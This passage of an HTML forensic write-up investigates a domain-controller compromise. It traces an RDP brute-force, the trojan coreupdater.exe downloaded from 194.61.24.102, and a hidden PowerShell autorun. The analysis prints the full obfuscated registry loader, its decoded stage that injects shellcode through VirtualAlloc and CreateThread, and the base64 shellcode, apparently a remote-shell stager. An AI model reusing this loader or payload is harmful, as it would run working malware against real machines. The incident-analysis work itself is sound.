+<span>Figure 3 - Alerts</span></p>
+</center><p><span>According to the alerts, the incident occurred at 2 AM, but I decided to study the previous traffic (Figure 4).</span></p><center>
+<p><img src="https://i.imgur.com/YDDJESX.png" alt="" loading="lazy"><br>
+<span>Figure 4 - Statistics on previous traffic</span></p>
+</center><p><span>This traffic contains a lot of other traffic (Kerberos, LDAP, DNS, and others) between 10.42.85.10 and 10.42.85.115. Among the traffic, I found information about 10.42.85.10 (Figure 5).</span></p><center>
+<p><img src="https://i.imgur.com/DyhMgre.png" alt="" loading="lazy"><br>
+<span>Figure 5 - Information about 10.42.85.10</span></p>
+</center><p><span>So this is a Server and a Domain Controller. Windows Server. The name - CITADEL-DC01.</span></p><p><span>Also, 10.42.85.115 is probably a legitimate user and possibly an admin.</span></p><p><span>Now let’s analyze the malicious traffic.</span></p><p><span>194.61.24.102 started the action at 02:19:13 by pinging the DC, as shown in Figure 6.</span></p><center>
+<p><img src="https://i.imgur.com/Ps652NL.png" alt="" loading="lazy"><br>
+<span>Figure 6 - Ping 10.42.85.10</span></p>
+</center><p><span>After that, according to Suricata, he scanned the DC port 3389 (Figure 7).</span></p><center>
+<p><img src="https://i.imgur.com/NbezU9J.png" alt="" loading="lazy"><br>
+<span>Figure 7 - Scan the 3389 port</span></p>
+</center><p><span>Then attacker tried to execute many connection requests via RDP (port 3389), which looked like a brute-force attack (Figure 8).</span></p><center>
+<p><img src="https://i.imgur.com/nrGPNJB.png" alt="" loading="lazy"><br>
+<span>Figure 8 - Bruteforce attack at RDP</span></p>
+</center><p><span>At 02:21:47, he successfully connected to the server. Then at 02:24:06, he downloaded the Trojan (Figure 9).</span></p><center>
+<p><img src="https://i.imgur.com/Rt8h9kB.png" alt="" loading="lazy"><br>
+<span>Figure 9 - Coreupdater.exe is downloaded</span></p>
+</center><p><span>It uploaded the file - coreupdater.exe, which was designated as a trojan. There are IP addresses of </span><a href="http://bing.com" target="_blank" rel="noopener"><span>bing.com</span></a><span>. So I think it uses IE.</span></p><p><span>Then a new IP address appeared in the traffic - 203.78.103.109 (Figures 10 and 11). The browser reports that it is malicious.</span></p><center>
+<p><img src="https://i.imgur.com/NRmjCqB.png" alt="" loading="lazy"><br>
+<span>Figure 10 - Traffic with 203.78.103.109</span></p>
+<p><img src="https://i.imgur.com/JekIOZd.png" alt="" loading="lazy"><br>
+<span>Figure 11 - Info about 203.78.103.109</span></p>
+</center><p><span>Until 02:35:55, there is only a connection between the server and the attacker, but 10.42.85.10 scans 10.42.85.115:3389 (Figure 12).</span></p><center>
+<p><img src="https://i.imgur.com/2wA5LpH.png" alt="" loading="lazy"><br>
+<span>Figure 12 - Scan 10.42.85.115:3389</span></p>
+</center><p><span>Then at 02:36:23 10.42.85.10 connects to 10.42.85.115:3389 via RDP (Figure 13).</span></p><center>
+<p><img src="https://i.imgur.com/wWhcDny.png" alt="" loading="lazy"><br>
+<span>Figure 13 - Connecting to 10.42.85.115 via RDP</span></p>
+</center><p><span>Then there is an LDAP, SMB, etc., a connection between them. It looks like the attacker tried to open Kerberos to gain access (Figure 14).</span></p><center>
+<p><img src="https://i.imgur.com/9RYl3Tb.png" alt="" loading="lazy"><br>
+<span>Figure 14 - Part of the traffic on Kerberos</span></p>
+</center><p><span>At 02:39:58 - The desktop downloaded a trojan (Figure 15).</span></p><center>
+<p><img src="https://i.imgur.com/W934Okj.png" alt="" loading="lazy"><br>
+<span>Figure 15 - Desktop downloaded the trojan</span></p>
+</center><p><span>Since it was possible to download the Trojan directly, and no proxy connection was configured, we can say that the IP address </span><code>194.61.24.102</code><span> was white. Judging by the data of the service </span><strong><a href="http://whois.ru" target="_blank" rel="noopener"><span>whois.ru</span></a></strong><span> (Figure 16):</span></p><center>
+<p><img src="https://i.imgur.com/uFj7d5F.png" alt="" loading="lazy"><br>
+<span>Figure 16 - Whois info</span></p>
+</center><p><span>The country of registration of this IP address in Russia. And the company that owns this IP address is RU-ERAHOST-20181031 (Saint-Petersburg).</span></p><div class="alert alert-info">
+<h3 id="Timeline1" data-id="Timeline"><a class="anchor hidden-xs" href="#Timeline1" title="Timeline1"><span class="octicon octicon-link"></span></a><span>Timeline</span></h3>
+<p><strong><span>19 September 2020 02:19:13</span></strong><span> - 194.61.24.102 ping the 10.42.85.10.</span><br>
+<strong><span>19 September 2020 02:19:26</span></strong><span> - 194.61.24.102 scan the 10.42.85.10:3389.</span><br>
+<strong><span>19 September 2020 02:20:26 - 02:21:47</span></strong><span> - tries to bruteforce the password.</span><br>
+<strong><span>19 September 2020 02:21:47</span></strong><span> - Successfuly connected.</span><br>
+<strong><span>19 September 2020 02:22:08</span></strong><span> - Connected againg.</span><br>
+<strong><span>19 September 2020 02:22:36</span></strong><span> - Connected third time.</span><br>
+<strong><span>19 September 2020 02:24:06</span></strong><span> - Trojan (coreupdater.exe) was downloaded from 194.61.24.102 to </span><strong><span>DS01</span></strong><span>.</span><br>
+<strong><span>19 September 2020 02:29:49</span></strong><span> - Suspicious request to </span><code>203.78.103.109</code><span> over https protocol.</span><br>
+<strong><span>19 September 2020 02:35:55</span></strong><span> - 10.42.85.10 scan 10.42.85.115:3389.</span><br>
+<strong><span>19 September 2020 02:36:23</span></strong><span> - 10.42.85.10 connect to 10.42.85.115:3389 via RDP.</span><br>
+<strong><span>19 September 2020 02:39:58</span></strong><span> - Trojan was downloaded from </span><code>http://194.61.24.102/coreupdater.exe</code><span> to </span><strong><span>DESKTOP</span></strong><span>.</span></p>
+</div><p><span>With that, I think we’re done with the pcap file. We can use disk images to get malware. We can also view memory and log files. But let’s move on to autorun.</span></p><hr><center>
+<h2 id="Part-2---Autorunsc---Table-of-1000-entries" data-id="Part-2---Autorunsc---Table-of-1000-entries"><a class="anchor hidden-xs" href="#Part-2---Autorunsc---Table-of-1000-entries" title="Part-2---Autorunsc---Table-of-1000-entries"><span class="octicon octicon-link"></span></a><span>Part 2 - Autorunsc - Table of 1000 entries</span></h2>
+<h3 id="Vladimir-Ivan1" data-id="Vladimir-Ivan"><a class="anchor hidden-xs" href="#Vladimir-Ivan1" title="Vladimir-Ivan1"><span class="octicon octicon-link"></span></a><span>Vladimir, Ivan</span></h3>
+</center><hr><p><span>This is a data table containing about 1000 records. Thus, it can be analyzed manually using Excel or LibreOffice. The first thing I did was detect a suspicious action with Powershell. There is one such.</span></p><table>
+<thead>
+<tr>
+<th><span>Time</span></th>
+<th><span>Entry Location</span></th>
+<th><span>Entry</span></th>
+<th><span>Enabled</span></th>
+<th><span>Category</span></th>
+<th><span>Profile</span></th>
+<th><span>Description</span></th>
+<th><span>Signer	Company</span></th>
+<th><span>ImagePath</span></th>
+<th><span>Launch String</span></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>8/22/2013 3:59 AM</span></td>
+<td><span>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></td>
+<td><span>coreupdate</span></td>
+<td><span>enabled</span></td>
+<td><span>Logon</span></td>
+<td><span>System-wide</span></td>
+<td><span>Windows PowerShell	(Verified) Microsoft Windows</span></td>
+<td><span>Microsoft Corporation</span></td>
+<td><span>c:\windows\system32\windowspowershell\v1.0\powershell.exe</span></td>
+<td><span>%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c “sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item ‘HKLM:Software\9sEoCawv’).GetValue(‘45SVAG2o’))))”"</span></td>
+</tr>
+</tbody>
+</table><p><span>Only the fact that it hides is malicious. It also calls the string (Base64) expression from the registry key. There is another suspicious entry.</span></p><table>
+<thead>
+<tr>
+<th><span>Time</span></th>
+<th><span>Entry Location</span></th>
+<th><span>Entry</span></th>
+<th><span>Enabled</span></th>
+<th><span>Category</span></th>
+<th><span>Profile</span></th>
+<th><span>Description</span></th>
+<th><span>Signer	Company</span></th>
+<th><span>ImagePath</span></th>
+<th><span>Launch String</span></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>4/14/2010 3:06 PM</span></td>
+<td><span>HKLM\System\CurrentControlSet\Services</span></td>
+<td><span>coreupdater</span></td>
+<td><span>enabled</span></td>
+<td><span>Services</span></td>
+<td><span>System-wide</span></td>
+<td><span>coreupdater:</span></td>
+<td></td>
+<td><span>c:\windows\system32\coreupdater.exe</span></td>
+<td><span>C:\Windows\System32\coreupdater.exe</span></td>
+</tr>
+</tbody>
+</table><p><span>It started from the system folder but is not signed by Microsoft and enabled autorun.</span></p><p><span>Further investigation of these elements will be possible with the mounted disk. So first, let’s take a look at memory. Ivan receives the </span><strong><span>SOFTWARE</span></strong><span> registry hives from the E01 disk image (Figure 17).</span></p><center>
+<p><img src="https://i.imgur.com/oUPvASr.png" alt="" loading="lazy"><br>
+<span>Figure 17 - hivexsh SOFTWARE</span></p>
+</center><p><span>Here we can see the data from the PowerShell command (Figure 18).</span></p><center>
+<p><img src="https://i.imgur.com/v0wiaFY.png" alt="" loading="lazy"><br>
+<span>Figure 18 - Base64 encoded command</span></p>
+</center><p><span>I decrypted it from base64, but got another encrypted string:</span></p><div class="alert alert-info">
+<pre><code class="c hljs"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token operator">::</span>Size <span class="token operator">-</span>eq <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    $b<span class="token operator">=</span>$env<span class="token operator">:</span>windir<span class="token operator">+</span><span class="token string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span>
+    
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    $b<span class="token operator">=</span><span class="token string">'powershell.exe'</span>
+    
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+$s<span class="token operator">=</span>New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>ProcessStartInfo<span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>FileName<span class="token operator">=</span>$b<span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>Arguments<span class="token operator">=</span><span class="token string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('</span><span class="token string">'H4sIACltZV8CA7VWa2+bSBT9nEj5D6iyBCiOjV2nzUaqtIAhxjWJKTZ27FoVhjFMPIADQ2zS7X/fOzakqZrstistQmIe93numbms8tijOIm53ccl4b6eHB8N3dSNOKEW33TrXC0ZjAPx6AjWa7u73ZT7wAlzebPpJpGL48XlpZqnKYrpYd64QlTOMhQtCUaZIHJ/cZMQpejsZnmHPMp95WpfGlckWbqkFCtU1wsRdybHPtsbJJ7LomnYG4KpwH/+zIvzs9aiod3nLskE3i4yiqKGTwgvct9E5nBUbJDAm9hLkyxZ0cYEx2/bjXGcuSt0DdYekIlomPgZL0IW8KaI5mnM7fNhBg7bAg/DYZp4su+nKMv4OjdnpueLxZ/CvPT7KY8pjlDDiClKk42N0gfsoazRc2OfoE9otQAtm6Y4DhaiCGIPyRoBlDkhde53zAjXaFuh9qtKwnMlkBrSVKxDIV/I00z8nKCDJv9CoKz4IjwVAQC5byfHJ8erii33xOmZz+kCo6P5fowgPGGYZHgv+IGT6pwJjlyapAVMa6M0R+LiCVyuthniUVF/3UCrkgbZtAULcyfB/gIUyoLWAm29s9jG68zsohWOUbeI3Qh7FfmEl2BGK4L2STYqsWuISeDLDeR3EUGBSxlwrNo/qWkRpk+6So6Jj1LZg1JlEBVUUfwxmEMtBN6ITRQBRoc50K+2AsqjSrqkeVF5Z3MQ4lXiZlmdG+Zw5rw6ZyOXIL/OyXGGyy05p8l+yH8P18wJxZ6b0crcQnwCsnSoJnFG09yDukHyI3uDPOwShkWd62EfKYWNg8ox/yISqksIHAWw9ACVgBWGgE0ZG1KI8VB5sWEjakQbgiIQ2h9/nbgBHPaS8Xv+uAHy+Z9irCh94C+Do8LhWYRQY5sktM45OKVwjTBo09Z/dP/s/jgEoqaorIZQnZK5UlBG7VqQYsbKEpg9DCkFCPQ0iRQ3Q+86h7tCeNPUcPd82E0eZXg0/ZPlKPbYmRmm3ye2Qe1bDQ/GYWjglhHAvBhrwZBKm4+jUa9vd3ty2t2FK9nIDK2nFFZLkb0efu/0lfEY9LA6sO52huwrUTANbtWtMQynBjhSB4ERwFcxQk+RZlKgSLo6sJVQw5Ic2FbP6rRmRvOCKPjRNmy5N3ny9+RH63R6091Ivjb7cqjf+Hqrre/110x/tr4adLX93GNz6zbTsAZ+NP3WckI0cTbKRNNnlrMxgtNtYDmDZkcPFVg38G6wsZvwtFr9h9h/NMnFownhWs6sj9HMCFARyJYs27cxsZdbVZav3hfSebwc62NYW4+MeGctN6Zf3PaafzgmRptEtjRZ1gmcykh2t91ma5IolnNujTVpV4yl3Va7a2413N+uy+/46t27oLnqDJuObcQ9N1Qg3qLfWeP+KexFriPdrpoOw6+rxc3HeErcodpKyLLZGuPue0UxMOpfmx65VyBnsHFuLRO17YUriMkILqxgmsRtdw12J4EM0UF+UOdV3wAdJSd4PT6dMlv9rRT1dxKLM+pfQGztMgaZxsa0CfHJva6txle2MW37SFeap96HN4yzQNpa0HvGxNdaiemmWegSYCj0iOpm0JNUL6/9YYKZhiDsfxbWKI0RgV4L3bg6WzIhice6zqFBQMs7NCLWF8cwfNt+cSRyT4Li93ZULV1eziBMOLBwnhoDFAc0rEu7t5IErUXadSTI8dczU5NNITBLddaZAJfSLtnbFdn5raEv9/T/hau8NUL4+P8K1/e1f9j9JQilOkv4p8UfF34Lzt/OfOJiCpI2XHsEHVrvKwCU1Hj2e8LqApVflQ/7v7zJ6dk1/LWcHP8N+iP4ZsoKAAA='</span><span class="token string">'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span><span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>UseShellExecute<span class="token operator">=</span>$false<span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>RedirectStandardOutput<span class="token operator">=</span>$true<span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>WindowStyle<span class="token operator">=</span><span class="token string">'Hidden'</span><span class="token punctuation">;</span>
+$s<span class="token punctuation">.</span>CreateNoWindow<span class="token operator">=</span>$true<span class="token punctuation">;</span>
+$p<span class="token operator">=</span><span class="token punctuation">[</span>System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">Start</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+</div><p><span>I decrypted it from base64 again but got junky data. So I tried different compression algorithms. Gunzip gives me the result as shown below:</span></p><div class="alert alert-info">
+<pre><code class="c hljs">function xKbl <span class="token punctuation">{</span>
+	<span class="token function">Param</span> <span class="token punctuation">(</span>$nOD<span class="token punctuation">,</span> $oLUg<span class="token punctuation">)</span>		
+	$xjxX <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>AppDomain<span class="token punctuation">]</span><span class="token operator">::</span>CurrentDomain<span class="token punctuation">.</span><span class="token function">GetAssemblies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> Where<span class="token operator">-</span>Object <span class="token punctuation">{</span> $_<span class="token punctuation">.</span>GlobalAssemblyCache <span class="token operator">-</span>And $_<span class="token punctuation">.</span>Location<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span><span class="token string">'System.dll'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetType</span><span class="token punctuation">(</span><span class="token string">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="token punctuation">)</span>
+	
+	<span class="token keyword">return</span> $xjxX<span class="token punctuation">.</span><span class="token function">GetMethod</span><span class="token punctuation">(</span><span class="token string">'GetProcAddress'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>Type<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>@<span class="token punctuation">(</span><span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>String<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>$null<span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">]</span><span class="token punctuation">(</span>New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span><span class="token function">HandleRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>New<span class="token operator">-</span>Object IntPtr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>$xjxX<span class="token punctuation">.</span><span class="token function">GetMethod</span><span class="token punctuation">(</span><span class="token string">'GetModuleHandle'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>$null<span class="token punctuation">,</span> @<span class="token punctuation">(</span>$nOD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> $oLUg<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+function qlVHM <span class="token punctuation">{</span>
+	<span class="token function">Param</span> <span class="token punctuation">(</span>
+		<span class="token punctuation">[</span><span class="token function">Parameter</span><span class="token punctuation">(</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> Mandatory <span class="token operator">=</span> $True<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Type<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> $pPiTy<span class="token punctuation">,</span>
+		<span class="token punctuation">[</span><span class="token function">Parameter</span><span class="token punctuation">(</span>Position <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Type<span class="token punctuation">]</span> $r1 <span class="token operator">=</span> <span class="token punctuation">[</span>Void<span class="token punctuation">]</span>
+	<span class="token punctuation">)</span>
+	
+	$gEkxQ <span class="token operator">=</span> <span class="token punctuation">[</span>AppDomain<span class="token punctuation">]</span><span class="token operator">::</span>CurrentDomain<span class="token punctuation">.</span><span class="token function">DefineDynamicAssembly</span><span class="token punctuation">(</span><span class="token punctuation">(</span>New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span><span class="token function">AssemblyName</span><span class="token punctuation">(</span><span class="token string">'ReflectedDelegate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>Emit<span class="token punctuation">.</span>AssemblyBuilderAccess<span class="token punctuation">]</span><span class="token operator">::</span>Run<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">DefineDynamicModule</span><span class="token punctuation">(</span><span class="token string">'InMemoryModule'</span><span class="token punctuation">,</span> $false<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">DefineType</span><span class="token punctuation">(</span><span class="token string">'MyDelegateType'</span><span class="token punctuation">,</span> <span class="token string">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>MulticastDelegate<span class="token punctuation">]</span><span class="token punctuation">)</span>
+	$gEkxQ<span class="token punctuation">.</span><span class="token function">DefineConstructor</span><span class="token punctuation">(</span><span class="token string">'RTSpecialName, HideBySig, Public'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>CallingConventions<span class="token punctuation">]</span><span class="token operator">::</span>Standard<span class="token punctuation">,</span> $pPiTy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetImplementationFlags</span><span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>
+	$gEkxQ<span class="token punctuation">.</span><span class="token function">DefineMethod</span><span class="token punctuation">(</span><span class="token string">'Invoke'</span><span class="token punctuation">,</span> <span class="token string">'Public, HideBySig, NewSlot, Virtual'</span><span class="token punctuation">,</span> $r1<span class="token punctuation">,</span> $pPiTy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetImplementationFlags</span><span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>
+	
+	<span class="token keyword">return</span> $gEkxQ<span class="token punctuation">.</span><span class="token function">CreateType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>$gri <span class="token operator">=</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Convert<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span><span class="token string">"/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7y05nbUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoBQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c="</span><span class="token punctuation">)</span>
+		
+$gH <span class="token operator">=</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>Marshal<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">GetDelegateForFunctionPointer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xKbl kernel32<span class="token punctuation">.</span>dll VirtualAlloc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>qlVHM @<span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token operator">::</span>Zero<span class="token punctuation">,</span> $gri<span class="token punctuation">.</span>Length<span class="token punctuation">,</span><span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>Marshal<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">Copy</span><span class="token punctuation">(</span>$gri<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $gH<span class="token punctuation">,</span> $gri<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+
+$e_qt <span class="token operator">=</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>Marshal<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">GetDelegateForFunctionPointer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xKbl kernel32<span class="token punctuation">.</span>dll CreateThread<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>qlVHM @<span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>UInt32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token operator">::</span>Zero<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>$gH<span class="token punctuation">,</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token operator">::</span>Zero<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token operator">::</span>Zero<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>Marshal<span class="token punctuation">]</span><span class="token operator">::</span><span class="token function">GetDelegateForFunctionPointer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xKbl kernel32<span class="token punctuation">.</span>dll WaitForSingleObject<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>qlVHM @<span class="token punctuation">(</span><span class="token punctuation">[</span>IntPtr<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>Int32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>$e_qt<span class="token punctuation">,</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">|</span> Out<span class="token operator">-</span>Null
+
+</code></pre>
+</div><p><span>It received the address of the process. Then it forms an array of bytes with a base64 string that I can’t decode. After that, it allocates memory using VirtualAlloc. Then it creates a new stream with data from the array.</span></p><p><span>So, we have written the decoded string to the </span><strong><span>shell.dat file</span></strong><span>:</span></p><div class="alert alert-info">
+<pre><code class="bash hljs"><div class="wrapper"><div class="gutter linenumber"><span></span></div><div class="code"><span class="hljs-built_in">echo</span> <span class="hljs-string">"/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7y05nbUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoBQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c="</span> | base64 --decode &gt; shell.dat
+</div></div></code></pre>
+</div><p><span>And then analyzed it using </span><strong><span>capa</span></strong><span> as shown in Figure 19.</span></p><center>
+<p><img src="https://i.imgur.com/zOzYvHw.png" alt="" loading="lazy"><br>
+<span>Figure 19 - Analyzed the code with </span><strong><span>capa</span></strong></p>
+</center><p><span>According to MITRE, this is an attack with </span><strong><span>Shared Modules</span></strong><span>.</span></p><blockquote>
+<p><span>Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can load DLLs from arbitrary local paths and Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API, called from CreateProcess, LoadLibrary, etc., of the Win32 API.</span></p>
+</blockquote><p><span>I also decided to look at the ** SYSTEM** registry hives. Here I found information about the time zone (Figure 20).</span></p><center>
+<p><img src="https://i.imgur.com/GUO1Jwr.png" alt="" loading="lazy"><br>
